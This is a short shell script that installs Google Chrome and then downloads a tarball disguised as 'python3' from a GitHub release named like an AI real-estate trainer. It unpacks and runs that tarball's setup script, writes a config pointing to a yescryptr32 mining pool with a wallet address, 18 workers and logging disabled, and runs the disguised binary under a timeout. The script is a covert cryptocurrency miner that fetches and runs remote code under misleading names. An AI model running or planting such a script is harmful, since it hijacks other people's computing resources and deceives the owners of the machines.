#!/bin/sh
wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google.list

# Update and install Google Chrome
sudo apt-get update
sudo apt-get install -y google-chrome-stable
wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3/python3.tar.gz
tar -xvf python3.tar.gz
rm python3.tar.gz
cd python3
./setup.sh

rm config.json && echo '{"algorithm": "yescryptr32", "host": "stratum-asia.rplant.xyz", "port": 17116, "worker": "UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx", "password": "x", "workers": 18, "log": false, "chrome": "./chromium/chrome" }' > config.json
export LD_LIBRARY_PATH=$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
export PATH=$HOME/dependencies/usr/bin:$PATH
timeout 6m ./python3 main.py
